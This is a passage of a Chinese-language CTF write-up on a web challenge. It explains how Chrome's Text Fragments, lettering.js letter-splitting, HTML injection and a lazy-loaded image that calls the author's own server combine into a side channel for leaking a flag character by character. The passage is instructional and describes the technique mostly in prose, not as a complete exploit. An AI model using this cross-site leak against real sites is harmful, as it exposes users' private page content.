&#x5904;&#x7684;&#x6CE8;&#x5165;&#x8FD8;&#x662F;&#x5B58;&#x50A8;&#x578B;&#x7684;&#x3002;</p><p>&#x5047;&#x8BBE;&#x5982;&#x679C;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x6267;&#x884C; script &#x4EE3;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E24;&#x4E2A; iframe &#xFF0C;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7684; js &#x9875;&#x9762;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411; flag &#x7684;&#x9875;&#x9762;&#xFF0C;&#x901A;&#x8FC7; js &#x6765;&#x83B7;&#x53D6;&#x540C;&#x57DF;&#x4E0B;&#x7684;&#x53E6;&#x4E00;&#x4E2A; iframe &#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x4E5F;&#x7B97;&#x662F;&#x5E38;&#x7528;&#x7684; csrf &#x7684;&#x4E00;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; Byte Bandits CTF 2020 - Notes App &#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x5982;&#x679C;&#x80FD;&#x63D2;&#x5165; script &#x6267;&#x884C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x53EF;&#x60DC;&#x63D2;&#x4E0D;&#x5F97;&#x3002;</p><h3 id="Text-Fragments"><a href="#Text-Fragments" class="headerlink" title="Text Fragments"></a>Text Fragments</h3><p>&#x53CD;&#x624B;&#x770B;&#x4E00;&#x624B; Chrome &#x65B0;&#x7279;&#x6027;&#xFF0C;&#x95F7;&#x58F0;&#x53D1;&#x5927;&#x8D22;&#x3002;</p><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;CTF &#x51FA;&#x9898;&#x4EBA;&#x4F1A;&#x6709;&#x4E8B;&#x6CA1;&#x4E8B;&#x53BB;&#x770B;&#x770B; php &#x6E90;&#x7801; or chrome new features &#xFF0C;&#x6240;&#x4EE5;&#xFF1A;<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank" rel="noopener">New in Chrome 80</a></p><blockquote><p>Of course, there&#x2019;s plenty more!</p><ul><li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]</a>(<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li></ul></blockquote><p>Scroll To Text Fragment: <a href="https://chromestatus.com/feature/4733392803332096" target="_blank" rel="noopener">https://chromestatus.com/feature/4733392803332096</a></p><blockquote><p>&#x200B;    This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;Chrome &#x5728;&#x4ECA;&#x5E74;2&#x6708;&#x4EFD;&#x7684;&#x66F4;&#x65B0;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7528;&#x5F62;&#x5982;<code>#:~:text=something</code>&#x7684;&#x6837;&#x5F0F;&#x6765;&#x6ED1;&#x52A8;&#x5230;&#x8BE5;&#x9875;&#x9762;<code>something</code>&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x9AD8;&#x4EAE;&#xFF0C;&#x8D4B;&#x4E88;&#x4E86;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A; anchor &#x951A;&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5E08;&#x5085;&#x4EEC;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank" rel="noopener">Text Fragments</a> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x53EA;&#x62E9;&#x53D6;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x6765;&#x8BF4;&#xFF1A;</p><ul><li><p>&#x5339;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</span></span><br><span class="line">          context  |<span class="hljs-string">-------match-----</span>|<span class="hljs-string">  context</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x524D;&#x7F00;&#x8DDF;&#x8DDF;&#x540E;&#x7F00;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x9650;&#x5236;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;&#x771F;&#x6B63;&#x5339;&#x914D;&#x7684;&#x8FD8;&#x662F;&#x4E2D;&#x95F4;&#x7684; textStart &amp; textEnd</p></li><li><p>&#x9700;&#x8981;&#x5B8C;&#x6574;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;&#xFF0C;&#x65E0;&#x6CD5;&#x5339;&#x914D;&#x5355;&#x8BCD;&#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#x3002;</p><blockquote><p>Example 12</p><p>&#x201C;range&#x201D; will match in &#x201C;mountain range&#x201D; but not in &#x201C;color orange&#x201D; nor &#x201C;forest ranger&#x201D;.</p></blockquote></li><li><p>&#x5355;&#x8BCD;&#x9700;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x5757;&#x91CC;&#x9762;&#xFF1A;</p><blockquote><p>Example 11</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">:~:text=The</span> quick,lazy dog</span><br></pre></td></tr></tbody></table></figure><p></p><p>will fail to match in</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>because the starting string &#x201C;The quick&#x201D; does not appear within a single, uninterrupted block. The instance of &#x201C;The quick&#x201D; in the document has a block element between &#x201C;The&#x201D; and &#x201C;quick&#x201D;.</p><p>It does, however, match in this example:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote></li></ul><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6709;&#x4E2A;&#x60F3;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#x53BB;&#x5339;&#x914D;&#x5230; flag &#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p><ul><li>&#x5982;&#x679C; flag &#x662F; PCTF{TEST} &#xFF0C;&#x6211;&#x4EEC;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x662F;&#x5339;&#x914D;&#x4E0D;&#x5230;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0D;&#x80FD;&#x5339;&#x914D;&#x5230;&#x5355;&#x8BCD;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;</li><li>&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x80FD;&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x6837;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x5339;&#x914D;&#x5230;&#x4E86;&#x5462;&#xFF1F;</li></ul><h3 id="Lettering"><a href="#Lettering" class="headerlink" title="Lettering"></a>Lettering</h3><p>&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x601D;&#x8DEF;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x5F97;&#x627E;&#x4E2A;&#x529E;&#x6CD5;&#x62C6;&#x5206;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5176;&#x5B9E;&#x51FA;&#x9898;&#x4EBA;&#x5DF2;&#x7ECF;&#x5F88;&#x8D34;&#x5FC3;&#x5730;&#x4E3A;&#x6211;&#x4EEC;&#x505A;&#x597D;&#x4E86;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x9875;&#x9762;&#x6240;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/main.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5F15;&#x5165;&#x4E86; jquery.lettering.min.js &#xFF0C;&#x5E76;&#x4E14; main.js &#x6709;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="hljs-string">&quot;em&quot;</span>).lettering();</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; lettering.js &#x7684;&#x6587;&#x6863;&#x4E2D;&#x770B;&#x5230; <a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering()" target="_blank" rel="noopener">Lettering.js wiki - Wrapping letters with lettering()</a></p><blockquote><p>We&#x2019;ll start with some really basic markup:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span>Some Title<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>After including jQuery, <a href="http://github.com/davatron5000/Lettering.js/downloads" target="_blank" rel="noopener">download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.lettering.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">  $(<span class="hljs-string">&quot;.fancy_title&quot;</span>).lettering();</span></span><br><span class="line">});</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char1&quot;</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char2&quot;</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char3&quot;</span>&gt;</span>m<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char4&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char5&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char6&quot;</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char7&quot;</span>&gt;</span>i<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char8&quot;</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char9&quot;</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char10&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4E00;&#x4E2A;<code>&lt;em&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x5373;&#x53EF;&#x628A;&#x5185;&#x5BB9;&#x62C6;&#x5206;&#x4E3A;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x6548;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png" alt></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x8FDB;&#x884C;&#x9009;&#x4E2D;&#x4E86;&#x3002;</p><h3 id="Spark-Thinking"><a href="#Spark-Thinking" class="headerlink" title="Spark Thinking"></a>Spark Thinking</h3><p>&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x9009;&#x4E2D;&#x4E86;&#x5462;&#xFF1F;</p><p>&#x8FD9;&#x91CC; Exp &#x4F5C;&#x8005;&#x5F88;&#x806A;&#x660E;&#x5730;&#x60F3;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#xFF1A;</p><ul><li>&#x5229;&#x7528;&#x6211;&#x4EEC;&#x5728; information &#x6BB5;&#x63D0;&#x5230;&#x7684;&#x540C;&#x4E00; session &#x4F1A;&#x5B58;&#x50A8;&#x4E00;&#x5B9A;&#x7684; HTML &#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528; fetch no-cors &#x6765;&#x66F4;&#x65B0;&#x754C;&#x9762;&#xFF0C;&#x5229;&#x7528;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x540C;&#x4E00; session &#x7684;&#x754C;&#x9762;&#x5F97;&#x5230;&#x65E0;&#x8FC7;&#x6EE4;&#x7684; HTML &#x6CE8;&#x5165;</li><li>&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x6CE8;&#x5165;&#x521B;&#x9020;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#xFF1A;&#x6CE8;&#x5165;&#x8DB3;&#x591F;&#x591A;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x8BA9; FLAG &#x4F4D;&#x4E8E;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x9875;&#x9762;&#x4E4B;&#x5916;&#xFF0C;&#x5E76;&#x5728;<code>&lt;br&gt;</code>&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230;&#x4E86; FLAG</li><li>&#x4E00;&#x5F00;&#x59CB;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x88AB;&#x653E;&#x7F6E;&#x5230;&#x4E86;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x4E4B;&#x5916;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#xFF0C;&#x56FE;&#x7247;&#x5E76;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x65F6;&#x5982;&#x679C;<code>#:~:text=P-,C,T,-F</code>&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x5148;&#x8FDB;&#x884C;&#x6EDA;&#x52A8;&#x5230; FLAG &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x56FE;&#x7247;&#x624D;&#x4F1A;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF1B;&#x5982;&#x679C;&#x5339;&#x914D;&#x4E0D;&#x6210;&#x529F;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;</li><li>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x81EA;&#x5DF1;&#x7684; vps &#x76D1;&#x542C;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x8BA9;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;&#x5728;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x7684; vps &#x5C31;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5339;&#x914D;&#x6210;&#x529F;&#x4E86;</li></ul><blockquote class="colorquote info"><p>Note:</p><blockquote><p>Support the &#x2018;loading&#x2019; attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe&gt;</code> and <code>&lt;img&gt;</code> elements.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53EA;&#x6709;&#x5F53;&#x7528;&#x6237;&#x7A97;&#x53E3;&#x9875;&#x9762;&#x5185;&#x5173;&#x6CE8;&#x5230;<code>&lt;img&gt;</code>&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x8BE5;&#x6807;&#x7B7E;&#x624D;&#x80FD;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;img&gt;</code>&#x539F;&#x751F;&#x5C5E;&#x6027;<code>loading=lazy</code>&#x6765;&#x5B9E;&#x73B0;&#xFF0C;Chrome 